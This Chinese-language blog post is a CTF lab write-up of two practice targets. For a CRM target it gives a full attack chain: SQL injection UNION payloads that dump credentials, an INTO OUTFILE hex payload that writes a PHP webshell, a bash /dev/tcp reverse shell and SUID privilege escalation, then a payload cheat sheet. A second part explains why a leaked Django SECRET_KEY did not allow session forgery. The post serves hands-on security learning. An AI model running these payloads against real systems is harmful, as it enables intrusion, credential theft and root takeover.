---
title: CTF靶场实战笔记：两台靶机，从零到root
date: 2026-10-17 12:00:00
tags:
  - CTF
  - 渗透测试
  - 提权
  - SQL注入
categories:
  - 安全实战
---

两台靶机，从零到 root，把踩过的坑记下来。

## 一、两台靶机速览

**靶机A：172.16.11.50，Django 医院系统。**

- 拿到的东西：拖出了 admin 的密码哈希（PBKDF2 格式）、确认了 Django 的 `SECRET_KEY` 泄露。
- 没拿到的：最终权限。原因是 session 存在 Redis 里而不是 cookie 里，伪造签名的路线从根上走不通。
- 主要收获：知道了一条路走不通时，应该先回头验证前提，而不是继续往下砸时间。

**靶机B：10.10.1.56，YX-CRM 客户管理系统。**

- 拿到的东西：完整打穿。www-data 权限的 Shell，再利用 SUID 提权到 root，User 和 Root 两个 Flag 全部到手。
- 主要收获：走通了一条完整的攻击链，从外网一个搜索框到服务器最高权限。

两份经验放一起看，最值钱的一句话是：

> 靶机A教会我「什么时候该停下」，靶机B教会我「完整链条长什么样」。

## 二、靶机B的完整攻击链

从一个 IP 到一个 root，一共九步。

### 第 1 步：扫端口，看有哪些入口

```bash
nmap -sV 10.10.1.56
```

结果：22（SSH）和 80（HTTP）。Web 是主要下手点，SSH 先记着。

### 第 2 步：扫目录，看漏了什么

```bash
dirsearch -u http://10.10.1.56 -e php
```

关键发现：`/search.php` 是搜索页，`/uploads/` 是个空目录且目录列表开放，根目录下还挂着一个能直接下载的 `/schema.sql`。

`/uploads/` 能不能写、能不能访问，决定了后面能不能落马。

### 第 3 步：试注入，确认列数和回显位

```sql
-1' UNION ALL SELECT 1, 2, 3 #
```

页面三个位置分别显示 1、2、3，说明这条语句查 3 列，我能往第 2、3 列塞东西。开头的 `-1` 是清场用的：让前半句查不到数据，页面上只剩我注入的那一行。

### 第 4 步：拖库，把账号密码拿出来

```sql
-1' UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() #
-1' UNION ALL SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' #
-1' UNION ALL SELECT 1, group_concat(username, 0x3a, password), 3 FROM users #
```

`information_schema` 是 MySQL 自带的系统库，里面记着所有库和表的信息，相当于数据库的目录。`group_concat` 把多行拼成一行，才能在只有一个回显位的情况下看到全部内容。

### 第 5 步：看能不能读写文件

```sql
-1' UNION ALL SELECT 1, IF(@@secure_file_priv IS NULL,'IS_NULL',CONCAT('[',@@secure_file_priv,']')), 3 #
```

这一步决定后面能不能写马。要满足三件事：数据库账号有 FILE 权限、`secure_file_priv` 没有限制路径、我知道网站的绝对路径。

### 第 6 步：读源码，确定网站根目录

```sql
-1' UNION ALL SELECT 1, load_file('/var/www/html/index.php'), 3 #
```

能读出来就说明路径猜对了，根目录是 `/var/www/html`，同时也看到了拼接 SQL 的代码，注入点坐实。

### 第 7 步：写一句话木马

```sql
-1' UNION ALL SELECT 0x3c3f7068702073797374656d28245f4745545b305d293b203f3e,'','' INTO OUTFILE '/var/www/html/uploads/s.php' FIELDS TERMINATED BY '' LINES TERMINATED BY '' #
```

两个坑：payload 不能有单引号，所以整段 PHP 先转十六进制；UNION 多列会把字段分隔符写进文件，所以要用 `FIELDS TERMINATED BY ''` 清空分隔符。另外 `INTO OUTFILE` 不能覆盖已存在的文件，改名要换新的。

### 第 8 步：反弹 Shell

```bash
nc -lvnp 4444
```

```text
http://10.10.1.56/uploads/s.php?0=bash -c "bash -i >& /dev/tcp/我的IP/4444 0>&1"
```

先开门再敲门，顺序不能反。这条 URL 的本质是借 80 端口把命令送进木马，命令的内容是让服务器主动连回我的 4444。

### 第 9 步：提权到 root

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
/usr/local/bin/sysbash -p
id
```

`sudo` 那条路先试过，被判死了；SUID 是清单里的下一项，结果正好命中。`-p` 必须加，否则 bash 会自己把权限降回去。

## 三、核心知识点拆解

### 1. 登录后台不等于拿到系统权限

这是最容易搞混的一层。admin 是网站数据库 `users` 表里的一行数据，只在网页逻辑里管用，登进去还是只能点它给的按钮，跟操作系统没关系。

真正拿到系统权限，靠的是「让服务器执行我写的文件」。代码跑在 Apache/PHP 进程里，那个进程的身份是 www-data，你借的就是它。

所以必须满足两条：文件落在网站能访问到的目录里，并且是 `.php` 后缀。写在 `/tmp` 里等于白写，没人去解释它。

### 2. 反弹 Shell 为什么要反过来连

两次连接，方向相反、端口不同：

- **第一次**：我连它，走 80 端口，把命令送进去。因为目标只开了 22 和 80，只能从这个本来就开着的口子进。
- **第二次**：它连我，走 4444 端口，Shell 从这条路出来。

为什么要绕这一下？因为防火墙/NAT 对待入站和出站的态度不一样：你主动连它的 4444 会被拒，但它自己往外连一般不受限制。

`curl` 那条命令会卡住不动是正常现象，因为目标已经连回来占着通道了，不用等它。

### 3. 命令里每个符号的意思

```bash
bash -c "bash -i >& /dev/tcp/我的IP/4444 0>&1"
```

- **外层 `bash -c`**：保证用的是 bash 而不是 sh，因为 `/dev/tcp` 是 bash 独有的功能。
- **引号**：把整串包成一个字符串参数，避免 `>` 和 `&` 被当前 shell 提前解释掉。
- **`/dev/tcp/IP/端口`**：不是真文件，是 bash 内建的特殊路径，往它写东西等于建立一条 TCP 连接。
- **0、1、2**：程序的三条通道，分别是输入、输出、报错。`>&` 把后两条接过去，`0>&1` 把输入也接过去。
- **结果**：程序的输入、输出、报错三路全接到同一条 TCP 连接上，于是你在 nc 窗口敲命令、看结果。

### 4. 为什么要升级终端

刚连上的 Shell 没有终端，后果很具体：退格和 Tab 补全全废，`Ctrl+C` 会直接干掉整个 Shell，`sudo` 这类要求有终端的程序跑不起来。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

然后按 `Ctrl+Z` 挂起，回到本地执行：

```bash
stty raw -echo; fg
```

逻辑是：`pty.spawn` 在目标那侧造一个伪终端；`Ctrl+Z` 挂起回到本地；`stty` 把你本地终端改成透明管道；`fg` 拉回前台。两头都对了，按键才正常。

万一搞乱了，本地执行 `reset` 或 `stty sane` 能救回来。

### 5. 提权靠的是排除法，不是灵感

从低权限到 root 的通道是固定的，按成本从低到高过一遍就行：

1. **`sudo -l`**——判据是输出里有没有 `NOPASSWD`，一条命令就能判生死。
2. **口令复用**——拿捡到的明文密码去试 `su` 和 SSH，撞运气但成本极低。
3. **SUID/SGID**——判据是 `find` 的结果里有没有异常项，这次中的就是它。
4. **capabilities**——SUID 的现代替代品，用 `getcap` 看。
5. **计划任务和脚本**——看有没有你能写、而 root 会定时执行的东西。
6. **版本型 CVE**——比如 sudo 自身的漏洞，需要版本号匹配，最麻烦所以排最后。

关键在于每条路都有客观的判死标准，不是靠感觉。看到输出就该知道这条路死没死。

### 6. sudo 那条路为什么必死

sudo 提权其实有三种情况，混在一起就会卡住：

- **配置型**：管理员写了 `NOPASSWD`。`sudo -l` 的输出里会直接显示，这次没有。
- **凭据型**：sudo 正常，但你知道那个账号的密码。这次 www-data 是服务账号，shell 是 nologin，shadow 里密码位是锁定的，根本没有密码。
- **版本型**：sudo 软件自身的 CVE。需要版本匹配、要传 exp、可能还要编译，排在清单最后。

我手里那个数据库密码跟系统登录密码是两套体系，这叫**口令不复用**。碰上就别在密码上耗时间了。

### 7. SUID 到底是怎么把权限给出去的

一个进程身上挂着三组 UID：**ruid** 是你本来是谁，**euid** 是判权限时真正看的那组，**suid** 是留的副本。

内核在加载文件时如果发现 SUID 位，就把文件属主抄到 euid 上，ruid 不动。所以跑完 `sysbash` 之后 `id` 显示 `uid=33 euid=0`：前者是 ruid，一直是 33；后者被内核改成了 0。

而 Linux 判定文件能不能读，只看 euid，所以 `/root` 下那些 `drwx------` 的目录就放行了。

那为什么还要加 `-p`？因为 bash 启动时会自己检查，一旦发现 uid 和 euid 不一样就主动把权限降回去，这是它自带的保护机制。`-p` 是告诉它别多管闲事。不加 `-p` 跑完一看还是 www-data，等于白忙。

两个容易踩的限制：**脚本文件上的 SUID 位是无效的**，内核直接忽略，所以必须是二进制；分区如果用 `nosuid` 挂载，SUID 也不生效。

验证方法，提权前后各跑一次看内核给的三组 ID：

```bash
grep Uid /proc/self/status
```

四个数字依次是 real、effective、saved、filesystem。提权前是 `33 33 33 33`，`sysbash -p` 之后变成 `33 0 0 0`，这就是 SUID 生效的铁证。

## 四、靶机A留下的教训

那台 Django 靶机，`/api/internal/health` 这个接口把 Django 的 `SECRET_KEY` 和数据库密码一起吐了出来。拿到 `SECRET_KEY`，第一反应是伪造一个 admin 的 session cookie 登进去，这条路最后是死的。

**死因不在签名算法，而在 session 存哪儿。** 这个站的配置是：

```python
SESSION_ENGINE = 'django.contrib.sessions.backends.cache'
```

意思是 session 数据存在 Redis 里，cookie 里只有一个随机 ID，不携带用户身份。所以就算我把签名伪造得天衣无缝，服务端拿着那个 ID 去 Redis 里查，查到的还是我自己的匿名会话。

教训有两条：

- **第一，动手之前先验证前提。** 伪造 session 的前提是 session 得存在 cookie 里，这个前提不成立，后面花多少时间都是白费。应该先确认 `SESSION_ENGINE` 再决定路线。
- **第二，密钥泄露的价值取决于它保护的东西。** `SECRET_KEY` 确实泄露了，但它保护的是一个「取件码」，不是「包裹本身」，所以拿到它并不能直接换身份。

顺带记一个数字：那台拖出来的 admin 密码是 PBKDF2 格式，26 万轮迭代。本地 32 核跑字典大概每秒 190 次，跑完整 rockyou 要 20 小时以上。所以遇到高轮数的哈希，**先算一下性价比再决定要不要砸时间**。

## 五、速查清单

```bash
# 信息收集
nmap -sV <目标IP>
dirsearch -u http://<目标IP> -e php

# 注入利用
-1' UNION ALL SELECT 1, 2, 3 #
-1' UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() #
-1' UNION ALL SELECT 1, load_file('/var/www/html/index.php'), 3 #

# 拿 Shell
nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg

# 提权排查
id
sudo -l
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
getcap -r / 2>/dev/null
grep Uid /proc/self/status

# 找 Flag
find / -name "*flag*" -not -path "/proc/*" 2>/dev/null
cat /var/www/html/includes/db.php
```

一句话收尾：**拿到身份靠让服务器执行我的代码，往上爬一级靠配置缺陷，中间别在已经判死的路上耗时间。**
